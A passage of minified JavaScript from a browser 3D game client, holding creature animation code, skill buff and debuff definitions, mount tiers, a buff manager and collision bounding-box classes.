                const s = this.mesh(null, t.meshHead || null, (0 == e ? t.colSec : t.colPrim) || this.chest.data.color);
                s.data.lod = .25 * (3 - e),
                    this.blobs.push(s)
            }
            this.eyes = this.mesh(this.chest, t.meshEyes || "character/eyes.ho", t.colEyes || kf.black, null, jc.multimeshSimple),
                this.eyesBlink = 0,
                this.eyes.data.lod = 1.8,
                Vi(this.eyes.position, 0, -.05, .52)
        }
        tickFixed(t, e, s) {
            this.tickPushBack(t, e, s)
        }
        tickParts(t, e, s) {
            this.checkCycleReset(this.falling << 1 | (!this.falling && this.walking) << 2),
                this.walking ? this.speed = this.entity.speed / this.entity.size * .2 : this.speed = .5;
            const i = this.cycle(.5);
            if (Vi(this.chest.scale, .1 * i + 1, 1 + .1 * this.cycleSin, .1 * i + 1),
                Vi(this.chest.position, 0, .1 * this.cycleSin - .1, 0),
                Vi(this.chest.rotation, 5 * -this.pushBack[1], 0, 5 * this.pushBack[0]),
                this.chest.rotationNeedsUpdate = !0,
                br(this.chest.position, this.chest.position, this.pushBackOffset),
                this.eyes.visible && (this.eyesBlink > 0 ? this.eyesBlink -= t : Math.random() < .006 && (this.eyesBlink = .1),
                    Vi(this.eyes.scale, 1, this.eyesBlink > 0 ? .1 : 1, 1)),
                this.currentAnim) {
                const t = lr.easeOutExpo(this.currentAnim.fract ** 3);
                switch (this.currentAnim.id) {
                    case 0:
                        this.chest.position[2] += Math.sin(6.28 * t - 3.14)
                }
            }
            this.blobs.forEach((e, i) => {
                if (!e.visible)
                    return;
                const n = 0 == i ? this : this.blobs[i - 1];
                tn(Oa, n.position, e.position),
                    Vi(qa, 0, 0, .7 * -n.scale[0]),
                    mn(ja, qa, n.rotation[1]),
                    Qi(Oa, Oa, ja);
                const a = Wi(Oa);
                a > 30 * this.entity.size ? Yi(e.position, this.entity.Za) : sn(e.position, e.position, Oa, Math.max(0, Math.min(.5, 20 * t * (a - .7 * e.scale[1])))),
                    Vi(e.rotation, 0, pr(tn(Oa, n.position, e.position)), 0),
                    e.rotationNeedsUpdate = !0,
                    Gi(e.scale, .3 * (3 - i) * (.8 + .1 * this.cycle(.3 * i)) * this.scale[0]),
                    e.position[1] = Math.max(s.getHeight(e.position[0], e.position[2]) + .5 * e.scale[1], e.position[1] - 2.5 * t),
                    e.updateMatrixWorld(!1)
            }
            )
        }
        mountPosition(t) {
            hn(t, [0, .6, -.13], this.chest.KP)
        }
        mountLegs(t, e) {
            Vi(t.rotation, -1.5, e ? .2 : -.2, e ? .4 : -.4),
                Vi(t.position, e ? .6 : -.6, 0, .6)
        }
    }
    var ig = new vf({
        id: 76,
        breakOnCast: !0,
        icon: "skills/36",
        fx: {
            visual: sg,
            stick: _f.transformation,
            startSound: {
                id: "shaman/spiritAnimalCast",
                distance: 5,
                dynamic: !0
            },
            endSound: {
                id: "buffEnd",
                distance: 5,
                dynamic: !0
            }
        },
        statsStatic: (t, e) => {
            e.addStat(15, 40 + 5 * t.level)
        }
    })
        , ng = new vf({
            id: 68,
            passive: !0,
            statsStatic: (t, e) => {
                e.addStat(14, Math.round(35 * t.level))
            }
        })
        , ag = new vf({
            id: 52,
            icon: "skills/11",
            fx: {
                stick: _f.invigorateBuff,
                stickOffset: .5,
                startSound: {
                    id: "archer/invigoratebuff",
                    distance: 4
                },
                endSound: {
                    id: "buffEnd",
                    distance: 3
                }
            },
            custom: [[t => 9 * t, "% increased damage"]]
        })
        , rg = new vf({
            id: 69,
            icon: "skills/27",
            fx: {
                stick: _f.pathfinding,
                startSound: {
                    id: "archer/pathfindcast",
                    distance: 5
                }
            },
            diminish: !0,
            statsStatic: (t, e) => {
                e.addStat(15, Math.round((8 + 10 * t.level) * t.diminishFactor))
            }
        })
        , og = new vf({
            id: 71,
            passive: !0,
            icon: "skills/29",
            custom: [[t => 5 + 25 * t, "% per stack as additional damage over 10 seconds"]],
            afterDamageEnemy: {
                9: (t, e, s) => { }
            }
        })
        , lg = new vf({
            id: 72,
            type: 1,
            maxStacks: 3,
            tags: new Set([3, 1]),
            icon: "skills/29",
            fx: {
                stick: _f.poisonarrows,
                color: [.1, 1, .3, .3]
            },
            statsStatic: (t, e) => {
                e.maxStat(26, 30)
            }
            ,
            intervalDuration: 1.5,
            onInterval: (t, e, s) => ({
                id: 29,
                mode: 1,
                caster: t.caster,
                target: e.id,
                dmg: t.level * t.stacks,
                type: 1,
                noDaze: !0
            })
        })
        , cg = new vf({
            id: 82,
            maxStacks: 4,
            icon: "skills/31",
            instantCast: new Set([31]),
            beforeDamageEnemy: {
                31: (t, e, s, i) => { }
            }
        })
        , hg = new vf({
            id: 51,
            passive: !0,
            icon: "skills/10",
            custom: [[t => 2 + 1 * t, " Jumps"], [t => 10 + 11 * t, "% damage per Jump"]],
            afterDamageEnemy: {
                9: (t, e, s) => { }
            }
        })
        , dg = new vf({
            id: 78,
            icon: "skills/38",
            fx: {
                stick: _f.snipe
            },
            statsStatic: (t, e) => {
                e.addStat(15, 30)
            }
            ,
            instantCast: new Set([9]),
            onCast: {
                9: (t, e) => { }
            }
        })
        , ug = new vf({
            id: 83,
            passive: !1,
            incapacitated: !0,
            icon: "skills/38",
            statsOverride: (t, e) => {
                e.stat.set(15, 400)
            }
            ,
            movementOverride: (t, e, s, i, n) => {
                i.setSteer([n.data[0] - 1, n.data[1] - 1])
            }
        })
        , mg = new vf({
            id: 49,
            passive: !0,
            icon: "skills/8",
            statsConvert: [[2, .4, 10], [2, .4, 11]]
        })
        , pg = new vf({
            id: 67,
            icon: "skills/25",
            fx: {
                stick: _f.temporaldilation,
                startSound: {
                    id: "archer/timedilationcast",
                    distance: 5
                }
            },
            diminish: !0,
            statsStatic: (t, e) => {
                e.addStat(16, Math.round(30 * t.level * t.diminishFactor))
            }
        })
        , fg = new vf({
            id: 64,
            icon: "skills/22",
            fx: {
                stick: _f.arcticaura,
                startSound: {
                    id: "mage/arcticauracast",
                    distance: 5
                }
            },
            diminish: !0,
            statsStatic: (t, e) => {
                e.addStat(14, Math.round(30 * t.level * t.diminishFactor))
            }
        })
        , gg = new vf({
            id: 88,
            type: 1,
            tags: new Set([6]),
            incapacitated: !0,
            icon: "skills/deepFrozen",
            fx: {
                stick: _f.deepfrozen,
                color: [.1, .9, .8, .9]
            },
            statsStatic: (t, e) => {
                e.maxStat(26, 100)
            }
            ,
            multiplyIncomingDamage: {
                4: t => 1.5,
                15: t => 1.5
            }
        })
        , vg = new vf({
            id: 66,
            icon: "skills/24",
            fx: {
                stick: _f.enchantment,
                startSound: {
                    id: "mage/enchantcast",
                    distance: 5
                }
            },
            diminish: !0,
            statsStatic: (t, e) => {
                e.addStat(10, Math.floor(2 + 1.5 * t.level * t.diminishFactor)),
                    e.addStat(11, Math.floor(3 + 3.5 * t.level * t.diminishFactor))
            }
        })
        , yg = new vf({
            id: 96,
            icon: "skills/extraBolt",
            fx: {
                stickOffset: .15,
                stick: _f.extraBoltBuff
            }
        })
        , bg = new vf({
            id: 55,
            type: 1,
            tags: new Set([4]),
            icon: "skills/14",
            fx: {
                stick: _f.icenovaroot,
                color: [.7, .7, 1, .4]
            },
            statsStatic: (t, e) => {
                e.maxStat(26, 100)
            }
            ,
            addIncomingCrit: {
                4: t => 10 + 30 * t.level,
                15: t => 20 + 30 * t.level
            },
            intervalDuration: 1.5,
            onInterval: (t, e, s) => ({
                id: 14,
                mode: 1,
                caster: t.caster,
                target: e.id,
                dmg: s.stats.getDamageRoll() * (.1 + .3 * t.level),
                type: 1,
                noDaze: !0
            })
        })
        , wg = new vf({
            id: 86,
            type: 1,
            tags: new Set([3]),
            maxStacks: 4,
            icon: "skills/frozenBuff",
            fx: {
                stick: _f.frozen,
                color: [.1, .1, .8, .5]
            },
            statsStatic: (t, e) => {
                e.maxStat(26, 20)
            }
        })
        , xg = new vf({
            id: 57,
            icon: "skills/16",
            fx: {
                stick: _f.hypothermicBuff,
                stickOffset: .5,
                startSound: {
                    id: "mage/hypothermicCast",
                    distance: 4
                },
                endSound: {
                    id: "buffEnd",
                    distance: 3
                }
            },
            statsStatic: (t, e) => {
                e.addStat(16, 30 + 70 * t.level),
                    e.addStat(24, 2 + 7 * t.level)
            }
        })
        , kg = new vf({
            id: 87,
            passive: !0
        })
        , $g = new vf({
            id: 65,
            icon: "skills/23",
            fx: {
                stickOffset: .15,
                stick: _f.iceBlockBuff
            }
        })
        , Sg = new vf({
            id: 56,
            passive: !0
        })
        , Eg = new vf({
            id: 48,
            passive: !0,
            icon: "skills/8",
            statsConvert: [[3, .4, 10], [3, .4, 11]]
        })
        , Mg = new vf({
            id: 100,
            type: 0,
            icon: "skills/charm4",
            fx: {
                norefresh: !0,
                stick: _f.blueMarble,
                color: [0, 0, 1, .7]
            }
        })
        , _g = new vf({
            id: 80,
            type: 1,
            tags: new Set([3]),
            icon: "skills/dazedBuff",
            fx: {
                stick: _f.dazed,
                stickOffset: .5
            },
            statsStatic: (t, e) => {
                e.maxStat(26, 30)
            }
        })
        , Cg = new vf({
            id: 98,
            type: 0,
            icon: "skills/charm2",
            fx: {
                stick: _f.dmgBoostBuff,
                color: [1, 0, 0, .8]
            },
            statsStatic: (t, e) => {
                e.addStat(24, t.level)
            }
        })
        , Tg = new vf({
            id: 97,
            type: 0,
            icon: "skills/charm1",
            fx: {
                stick: _f.incomingDmgReduceAura,
                color: [.3, .3, .3, .9]
            },
            beforeIncomingDamage: (t, e, s, i) => s * (t.level / 100)
        });
    const Pg = {
        death: {
            id: "blob/death"
        },
        hurt: {
            id: "blob/hurt",
            rnd: 1
        },
        melee: {
            delay: .3,
            distance: 3,
            id: "blob/attack",
            rnd: 2
        },
        aggro: {
            id: "blob/aggro",
            rnd: 1
        },
        idle: {
            id: "blob/idle",
            rnd: 2
        }
    };
    class Ig extends Of {
        constructor(t) {
            t.sounds = Pg,
                super(t),
                this.chest = this.mesh(this, t.meshHead || null, t.colPrim || kf.greysteel),
                Vi(this.chest.scale, .6, .6, .6),
                this.chest2 = this.mesh(this.chest, t.meshBack || null, t.colSec || kf.woodbrown),
                Vi(this.chest2.scale, 1.2, 1.2, 1.4),
                Vi(this.chest2.position, 0, .1, -1),
                this.eyes = this.mesh(this.chest, t.meshEyes || "monsterparts/spiderEyes.ho", t.colEyes || kf.greysteel, null, jc.multimeshSimple),
                Vi(this.eyes.position, 0, -.05, .52),
                Vi(this.eyes.scale, .6, .6, .6),
                this.legs = [],
                this.legsize = t.legsize || 1;
            for (let e = 0; e < 2; ++e) {
                const e = this.mesh(this, "monsterparts/crawlerLegs.ho", t.colSec || kf.woodbrown, null, t.shader);
                e.data.lod = 1.5,
                    this.legs.push(e),
                    Gi(e.scale, this.legsize)
            }
            this.chestOffset = t.chestOffset || 0
        }
        tickFixed(t, e, s) {
            this.tickPushBack(t, e, s)
        }
        tickParts(t, e, s) {
            if (this.walking && !this.falling) {
                this.speed = this.entity.speed * (-1 === this.entity.steer[1] ? -1.2 : 1) * .8 / (.4 + .6 * this.entity.size + this.legsize);
                const e = Math.cos(this.cycleRad);
                Vi(this.legs[0].rotation, 0, .2 * this.cycleSin, .2 * this.cycleSin),
                    Vi(this.legs[0].position, 0, .3 * Math.abs(e) + .2, 0),
                    Vi(this.legs[1].rotation, 0, Math.PI + .2 * e, .2 * e),
                    Vi(this.legs[1].position, 0, .3 * Math.abs(this.cycleSin), 0),
                    this.legs[1].rotationNeedsUpdate = !0,
                    this.legs[0].rotationNeedsUpdate = !0,
                    Vi(this.chest.position, .01 * this.cycle(.3), .02 * this.cycleSin + this.chestOffset, 0),
                    Vi(this.chest.rotation, 0, .01 * this.cycleSin, .01 * Math.sin(2 * this.cycleRad)),
                    this.entity.target > 0 && Math.random() < .3 && this.fraction(.1, t) && dl({
                        id: "crawler/crawlerMove",
                        loop: !1,
                        transform: this,
                        distance: Math.min(1 + 3 * this.scale[1], 10),
                        force: this.scale[1] > 2
                    })
            } else if (this.speed = .5,
                this.currentAnim) {
                const t = lr.easeOutExpo(this.currentAnim.fract ** 3);
                switch (this.currentAnim.id) {
                    case 0:
                        {
                            const e = Math.sin(6.28 * t - 3.14);
                            Vi(this.chest.position, 0, Math.max(0, -e) + this.chestOffset, .5 * e),
                                this.legs.forEach((t, s) => {
                                    const i = 0 == s ? 1 : -1
                                        , n = 1 == s ? Math.PI : 0;
                                    Vi(t.rotation, i * Math.min(e, 0), n + .1 * e * i, 0),
                                        Vi(t.position, 0, Math.max(0, -e), .5 * e),
                                        t.rotationNeedsUpdate = !0
                                }
                                );
                            break
                        }
                }
            } else
                Vi(this.chest.position, 0, .1 * this.cycle(-.1) + this.chestOffset, 0),
                    this.legs.forEach((t, e) => {
                        const s = this.cycle(0 == e ? 0 : .5);
                        Vi(t.rotation, 0, 1 == e ? Math.PI : 0, this.falling ? .4 : 0),
                            Vi(t.position, 0, .1 * s, 0),
                            t.rotationNeedsUpdate = !0
                    }
                    );
            Vi(this.chest.rotation, this.chest.rotation[0] - 5 * this.pushBack[1], this.chest.rotation[1], this.chest.rotation[2] + 5 * this.pushBack[0])
        }
        mountPosition(t) {
            hn(t, [0, .8, -1], this.chest.KP)
        }
        mountLegs(t, e) {
            Vi(t.rotation, -.9, e ? .2 : -.2, e ? .4 : -.4),
                Vi(t.position, e ? .6 : -.6, -.4, .5)
        }
    }
    const Dg = t => {
        Gi(t.chest.scale, .8),
            Gi(t.chest2.scale, 1.1),
            Vi(t.chest2.position, 0, .2, -.8),
            Vi(t.chest2.rotation, 0, 3.14, 0),
            Vi(t.eyes.position, 0, -.2, .8),
            Gi(t.eyes.scale, .6)
    }
        , Ag = [[30, 1e4, 50, sg, {}], [30, 2e4, 50, Ig, {}], [30, 5e4, 80, Ig, {
            colEyes: or(11332842, 0),
            colPrim: or(4772165, -.2),
            colSec: or(1351204, -.2)
        }], [30, 5e4, 80, Ig, {
            colEyes: or(16751284, 0),
            colPrim: or(15737892, .5),
            colSec: or(15737892, .5)
        }], [30, 5e4, 95, Ig, {
            colEyes: or(14292553, 0),
            colPrim: or(4075311, .1),
            colSec: or(1970198, .1),
            legsize: .5,
            post: t => {
                Gi(t.chest.scale, .8)
            }
        }], [30, 5e4, 90, Ig, {
            colEyes: or(2029122, 0),
            colPrim: or(2565674, .3),
            colSec: or(2236197, .3),
            legsize: 1.4,
            post: t => {
                Vi(t.chest.scale, .6, .6, 1),
                    Vi(t.chest2.rotation, .5, 0, 0)
            }
        }], [30, 5e4, 80, sg, {
            colEyes: or(12825266, 0),
            colPrim: or(11313312, .1),
            colSec: or(8221555, .1),
            meshHead: "rocks/rock_02.ho",
            post: t => Vi(t.eyes.position, 0, 0, .75)
        }], [30, 5e4, 90, sg, {
            colEyes: or(15880973, 0),
            colPrim: kf.fireorange,
            colSec: kf.fireorange,
            meshHead: "rocks/rock_02.ho",
            post: t => {
                Vi(t.eyes.position, 0, 0, .75);
                const e = td(_f.burning, void 0, t);
                e && t.effects.push(e)
            }
        }], [30, 5e4, 95, sg, {
            colEyes: or(12451327, 0),
            colPrim: or(3950066, -.4),
            colSec: or(3525854, -.4),
            meshHead: "monsterparts/wyrmhead.ho",
            meshEyes: "monsterparts/wyrmEyes.ho",
            post: t => {
                const e = td(_f.etherwyrm, void 0, t.blobs[0]);
                e && t.effects.push(e)
            }
        }], [30, 5e4, 95, sg, {
            colEyes: or(2747996, 0),
            colPrim: or(1907231, .4),
            colSec: or(2293580, -.8),
            meshHead: "monsterparts/wyrmhead.ho",
            meshEyes: "monsterparts/wyrmEyes.ho",
            post: t => {
                const e = td(_f.shadowwyrm, void 0, t.blobs[0]);
                e && t.effects.push(e)
            }
        }], [30, 5e4, 80, Ig, {
            colEyes: or(16758891, 0),
            colPrim: or(15448667, .1),
            colSec: or(11370036, .1),
            legsize: .6,
            meshHead: "monsterparts/wyrmhead.ho",
            meshBack: "monsterparts/wyrmhead.ho",
            meshEyes: "monsterparts/wyrmEyes.ho",
            chestOffset: .5,
            post: Dg
        }], [30, 5e4, 95, Ig, {
            colEyes: or(16777215, 0),
            colPrim: kf.darksteel,
            colSec: kf.gold,
            legsize: .6,
            meshHead: "monsterparts/wyrmhead.ho",
            meshBack: "monsterparts/wyrmhead.ho",
            meshEyes: "monsterparts/wyrmEyes.ho",
            chestOffset: .5,
            post: Dg
        }], [30, 5e4, 95, Ig, {
            colEyes: or(16750598, 0),
            colPrim: or(13177876, -.6),
            colSec: or(16721931, -.7),
            legsize: 1.1,
            meshHead: "misc/misc_bones_skull.ho",
            meshBack: "monsterparts/wyrmhead.ho",
            meshEyes: "monsterparts/wyrmEyes.ho",
            post: t => {
                Gi(t.chest2.scale, .7),
                    Vi(t.eyes.position, 0, -.1, .55),
                    Gi(t.eyes.scale, .6);
                const e = td(_f.burning, void 0, t);
                e && t.effects.push(e)
            }
        }], [30, 5e4, 85, sg, {
            colEyes: kf.fireorange,
            colPrim: kf.darksteel,
            colSec: kf.fireorange
        }], [30, 5e4, 95, sg, {
            colEyes: kf.ice,
            colPrim: or(3980543, -.6),
            colSec: kf.ice,
            post: t => {
                const e = td(_f.arcticaura, void 0, t.blobs[1]);
                e && (t.effects.push(e),
                    e.position[1] = -.5)
            }
        }]].map(t => ({
            level: t[0],
            goldValue: t[1],
            quality: t[2],
            visual: t[3],
            visualData: t[4]
        }))
        , Bg = t => {
            Ag.forEach((e, s) => {
                t["mount" + s] = {
                    ...e,
                    type: "mount",
                    tier: s,
                    requiredSkills: [39],
                    useSkill: 102,
                    use: (t, e, i, n, a) => ({
                        id: 79,
                        mode: 4,
                        stacks: 1,
                        duration: 600,
                        caster: t.id,
                        target: t.id,
                        buffdata: [s],
                        sendBuffData: !0,
                        level: e
                    })
                }
            }
            )
        }
        ;
    var Rg = new vf({
        id: 79,
        breakOnCast: !0,
        icon: "skills/39",
        fx: {
            mount: t => Ag[t.data[0]].visual,
            mountVisualData: t => Ag[t.data[0]].visualData,
            startSound: {
                id: "shaman/spiritAnimalCast",
                distance: 5,
                dynamic: !0
            },
            endSound: {
                id: "buffEnd",
                distance: 5,
                dynamic: !0
            }
        },
        statsStatic: (t, e) => {
            e.addStat(15, 60)
        }
    })
        , zg = new vf({
            id: 99,
            type: 0,
            icon: "skills/charm3",
            fx: {
                stick: _f.moveBoost,
                color: [.3, 0, .6, .8]
            },
            statsStatic: (t, e) => {
                e.addStat(15, t.level)
            }
        })
        , Fg = new vf({
            id: 90,
            icon: "skills/postsummon",
            fx: {
                stick: _f.postsummon
            },
            diminish: !0,
            statsStatic: (t, e) => {
                e.addStat(15, 20)
            }
        })
        , Zg = ["potionhp", "potionMp"].map((t, e) => new vf({
            id: [84, 85][e],
            maxStacks: 1,
            icon: "skills/" + t,
            intervalHaste: !1,
            intervalDuration: .5,
            onInterval: (t, s, i) => ({
                id: 100,
                mode: [2, 3][e],
                caster: t.caster,
                target: s.id,
                heal: 1 == e ? void 0 : t.level,
                mprec: 0 == e ? void 0 : t.level,
                nocrit: !0
            })
        }))
        , Ug = new vf({
            id: 81,
            passive: !0,
            statsStatic: (t, e) => {
                e.addStat(15, 100),
                    e.addStat(12, 1e4)
            }
        })
        , Lg = new vf({
            id: 74,
            type: 1,
            tags: new Set([6]),
            incapacitated: !0,
            visualIncapacitation: !0,
            icon: "skills/stunBuff",
            fx: {
                stick: _f.stunned,
                stickOffset: .5
            },
            movementOverride: (t, e, s, i, n) => {
                i.setSteer([0, 0]),
                    i.setJump(0)
            }
        });
    const Ng = {
        blueMarble: Mg,
        moveBoost: zg,
        dmgBoost: Cg,
        incomingDmgReduce: Tg,
        postsummon: Fg,
        suddendeath: new vf({
            id: 89,
            maxStacks: 99,
            icon: "skills/suddenDeath",
            statsStatic: (t, e) => {
                e.maxStat(27, t.stacks)
            }
        }),
        hppotion: Zg[0],
        mppotion: Zg[1],
        stun: Lg,
        mount: Rg,
        daze: _g,
        resetting: Ug
    }
        , Og = {
            temperBoostBuff: Uf,
            temperBuff: Lf,
            tauntDebuff: Zf,
            chargeBuff: Df,
            warcryBuff: Nf,
            courageBuff: Af,
            armorreinforcementBuff: yf,
            crescentBleedDebuff: Rf,
            crescentBleedBuff: Bf,
            healOnBlockBuff: zf,
            blockBuff: Tf,
            blockBuffEnrage: Pf,
            specializationWarrior: Ff
        }
        , jg = {
            plaguespreaderBuff: Gf,
            plaguespreaderBuffPassive: Qf,
            agonizeDebuff: Kf,
            spiritanimalBuff: ig,
            caninehowlBuff: Wf,
            manaBuff: Vf,
            revitalizeBuff: Jf,
            specializationShaman: tg,
            decayBuff: Yf
        }
        , qg = {
            extraboltBuff: yg,
            deepFrozenBuff: gg,
            iceboltBuff: kg,
            frozenBuff: wg,
            enchantmentBuff: vg,
            arcticauraBuff: fg,
            iceshieldBuff: $g,
            icicleBuff: Sg,
            frostnovaBuff: bg,
            specializationMage: Eg,
            hypothermicBuff: xg
        }
        , Xg = {
            snipeMoveBuff: ug,
            preciseshotBuff: cg,
            snipeBuff: dg,
            poisonarrowsBuff: og,
            poisonarrowsDebuff: lg,
            temporaldilationBuff: pg,
            pathfindingBuff: rg,
            cranialpuncturesBuff: ng,
            specializationArcher: mg,
            serpentArrowsBuff: hg,
            invigorateBuff: ag
        }
        , Hg = new Map;
    [Ng, Og, jg, qg, Xg].forEach(t => {
        for (const e in t)
            Hg.set(t[e].id, t[e])
    }
    );
    class Kg {
        constructor(t) {
            this.entity = t,
                this.buffs = new Map,
                this.casters = new Map,
                gf.forEach(t => {
                    this[t] = new Set
                }
                ),
                this.tags = new Map;
            for (let t = 0; t < 8; ++t)
                this.tags.set(t, new Set)
        }
        tick(t, e, s) { }
        setBuff(t, e, s, i, n, a) {
            s <= 0 && console.error("buff with zero or less stacks");
            const r = this.buffs.get(t) || this.buffs.set(t, new Map).get(t)
                , o = r.get(e) || {};
            if (o.caster = e,
                o.id = t,
                o.level = a,
                o.stacks = s,
                o.logic = Hg.get(t),
                o.diminish = 0,
                o.diminishFactor = 0,
                o.timer = new fh(i, n),
                o.remove = !1,
                void 0 !== o.logic.intervalDuration) {
                const t = Ua.entity(e);
                o.interval = new fh(i, o.logic.intervalHaste && void 0 !== t ? o.logic.intervalDuration / ff(t.stats.getStat(16)) : o.logic.intervalDuration)
            } else
                o.interval = new fh(0, 0);
            return r.set(e, o),
                o.logic.onSet(o, e, this),
                (this.casters.get(e) || this.casters.set(e, new Map).get(e)).set(t, o),
                o.logic.diminish && this.updateDiminish(t),
                o
        }
        removeBuff(t, e) {
            const s = this.buffs.get(t);
            if (s) {
                const i = s.get(e);
                if (i) {
                    i.logic.onRemove(i, e, this),
                        s.delete(e),
                        0 === s.size && this.buffs.delete(t);
                    const n = this.casters.get(e);
                    return n.delete(t),
                        0 === n.size && this.casters.delete(e),
                        i.logic.diminish && this.updateDiminish(t),
                        i
                }
            }
        }
        updateDiminish(t) {
            const e = this.buffs.get(t);
            e && e.forEach((t, s) => {
                t.diminish = e.size,
                    t.diminishFactor = 4 / (3 + e.size)
            }
            )
        }
        clear(t) {
            this.buffs.forEach((e, s) => {
                e.forEach((e, i) => {
                    e.logic.passive == t && this.removeBuff(s, i)
                }
                )
            }
            )
        }
        clearTempBuffs() {
            this.clear(!1)
        }
        clearPassiveBuffs() {
            this.clear(!0)
        }
        onDeath() {
            this.clearTempBuffs()
        }
    }
    class Wg extends Kg {
        constructor(t) {
            super(t)
        }
        setBuff(t, e, s, i, n, a, r, o) {
            const l = super.setBuff(t, e, s, i, n, a);
            l.data = o,
                this.entity.buffDisplayDirty = !0,
                1 !== r || l.logic.fx.norefresh || (void 0 !== l.fx && this.removeBuffEffect(l),
                    void 0 === l.logic.fx.startSound || void 0 === this.entity.transform || this.entity.transform.inFog || dl({
                        ...l.logic.fx.startSound,
                        transform: this.entity.transform
                    })),
                !l.fx && this.entity.transform && l.diminish < 2 && (l.fx = {},
                    l.logic.fx.visual && this.entity.transform.constructor !== l.logic.fx.visual && this.changeEntityVisual(l.logic.fx.visual),
                    l.logic.fx.mount && this.changeEntityMount(l.logic.fx.mount(l), l.logic.fx.mountVisualData(l)),
                    l.logic.fx.stick && (l.fx.stick = td(l.logic.fx.stick, void 0, this.entity.transform),
                        l.logic.fx.stickOffset && (l.fx.stick.position[1] += this.entity.height * l.logic.fx.stickOffset / .7),
                        0 === r && (l.fx.stick.data.time = Math.max(0, l.timer.passed(Ua.time)),
                            l.fx.stick.data.frame = Math.floor(l.fx.stick.time / .016)),
                        l.fx.stick.data.buff = l),
                    l.logic.fx.color && this.entity.transform.addColor(l.logic.fx.color))
        }
        removeBuff(t, e) {
            const s = super.removeBuff(t, e);
            s && (this.entity.buffDisplayDirty = !0,
                this.removeBuffEffect(s),
                s.logic.fx.endSound && dl({
                    ...s.logic.fx.endSound,
                    transform: this.entity.transform
                }))
        }
        removeBuffEffect(t) {
            if (void 0 !== t.fx) {
                if (t.diminish > 1) {
                    const e = this.buffs.get(t.id).values();
                    let s = e.next().value;
                    s === t && (s = e.next().value),
                        s.fx = t.fx,
                        t.fx.stick && (t.fx.stick.data.buff = s)
                } else
                    t.fx.stick && (t.fx.stick.data.remove = !0,
                        t.fx.stick.setParent(null),
                        t.fx.stick = void 0),
                        t.logic.fx.visual && this.entity.transform.constructor === t.logic.fx.visual && this.changeEntityVisual(),
                        t.logic.fx.mount && this.changeEntityMount(),
                        t.logic.fx.color && this.entity.transform.removeColor(t.logic.fx.color);
                t.fx = void 0
            }
        }
        changeEntityVisual(t) {
            const e = this.entity.transform;
            this.entity.remakeTransform(t),
                this.entity.transform.animQueue = e.animQueue,
                this.buffs.forEach(t => {
                    t.forEach(t => {
                        t.fx && void 0 !== t.fx.stick && t.fx.stick.setParent(this.entity.transform)
                    }
                    )
                }
                )
        }
        changeEntityMount(t, e) {
            this.entity.mount && (this.entity.mount.onRemove(),
                this.entity.mount = void 0),
                t && (this.entity.mount = new t({
                    entity: this.entity,
                    ...e
                }),
                    void 0 !== e.post && e.post(this.entity.mount),
                    this.entity.updateTransformScale(),
                    this.entity.updateVisualPosition(0, Ua.time, Ua, !0),
                    this.entity.updateTransformRotation(.016),
                    this.entity.updateMountRotation(.016))
        }
    }
    class Yg {
        constructor(t, e, s) {
            this.type = s,
                this.data = t,
                this.bounds = e,
                this.Za = [-0, -0, -0],
                this.rot = -0,
                this.gl = 0,
                this.gr = 0,
                this.gu = 0,
                this.gd = 0,
                this.l = 0,
                this.r = 0,
                this.t = 0,
                this.b = 0,
                this.u = 0,
                this.d = 0
        }
        update(t, e, s, i, n) {
            return this.Za = t,
                this.rot = e,
                this.aabb(),
                this
        }
        onRemove() { }
    }
    class Vg extends Yg {
        constructor(t, e, s, i, n, a) {
            super(t, e, 1),
                this.update(i, n, a)
        }
        aabb() {
            this.l = nr(this.Za[0] - this.radius, 0, this.bounds),
                this.r = nr(this.Za[0] + this.radius, 0, this.bounds),
                this.t = nr(this.Za[1] + .5 * this.height, 0, this.bounds),
                this.b = nr(this.Za[1] - .5 * this.height, 0, this.bounds),
                this.u = nr(this.Za[2] - this.radius, 0, this.bounds),
                this.d = nr(this.Za[2] + this.radius, 0, this.bounds)
        }
        update(t, e, s) {
            return this.height = s,
                this.radius = e,
                super.update(t, 0, e, s, e)
        }
    }
    class Gg extends Yg {
        constructor(t, e, s, i, n, a, r) {
            super(t, e, 16),
                this.update(i, s, n, a, r)
        }
        aabb() {
            const t = Math.abs(Math.sin(this.rot))
                , e = Math.abs(Math.cos(this.rot))
                , s = t * this.LX + e * this.width
                , i = t * this.width + e * this.LX;
            this.l = nr(this.Za[0] - .5 * s, 0, this.bounds),
                this.r = nr(this.Za[0] + .5 * s, 0, this.bounds),
                this.t = this.Za[1] + .5 * this.height,
                this.b = this.Za[1] - .5 * this.height,
                this.u = nr(this.Za[2] - .5 * i, 0, this.bounds),
                this.d = nr(this.Za[2] + .5 * i, 0, this.bounds),
                this.local = mn([0, 0, 0], this.Za, -this.rot),
                this.ll = this.local[0] - .5 * this.width,
                this.lr = this.local[0] + .5 * this.width,
                this.lu = this.local[2] - .5 * this.LX,
                this.ld = this.local[2] + .5 * this.LX
        }
        update(t, e, s, i, n) {
            return this.width = s,
                this.height = i,
                this.LX = n,
                super.update(t, e, s, i, n)
        }
    }
    const Qg = {
        posXZ: {
            type: 2
        },
        rot: {
            type: 1
        },
        steer: {
            type: 0
        },
        jump: {
            type: 0
        },
        entityType: {
            type: 0
        }
    }
        , Jg = {}
        , tv = {};
    let ev = 0;
    for (const t in Qg)
        tv[ev] = Qg[t].type,
            Jg[t] = ev++;
    class sv {
        constructor(t) {
            this.id = t.id || 0,
                this.type = t.type,
                void 0 === t.type && console.log("warning type", t.name),
                this.rot = 0,
                this.Za = [0, 0, 0],
                this.size = t.size,
                this.name = t.name
        }
        async init(t) {
            this.name = t.name || ""
        }
        preFixed(t, e, s) { }
        tickFixed(t, e, s) { }
        postFixed(t, e, s) { }
        preDelta(t, e, s) { }
        tickDelta(t, e, s) { }
        postDelta(t, e, s) { }
        onRemove() { }
        setXZPos(t) {
            this.Za[0] = t[0],
                this.Za[2] = t[1]
        }
        setRot(t) {
            this.rot = ur(t)
        }
        compareDelta(t, e, s) {
            let i = !1;
            for (const [n, a] of t) {
                e.get(n) !== a ? (e.set(n, a),
                    i = !0) : s && t.delete(n)
            }
            return i
        }
        parseDelta(t, e, s) {
            switch (t) {
                case Jg.posXZ:
                    this.setXZPos(Od(e, 768));
                    break;
                case Jg.rot:
                    this.setRot(Zd(e, hr));
                    break;
                case Jg.steer:
                    {
                        const t = Ld(e);
                        this.setSteer([nr(t[0] - 1, -1, 1), nr(t[1] - 1, -1, 1)]);
                        break
                    }
                case Jg.jump:
                    this.setJump(nr(e, 0, 1))
            }
        }
        onTarget(t) {
            return !0
        }
        setName(t) {
            this.name = t
        }
        clampWorldPos() {
            Ua.clampV3(this.Za),
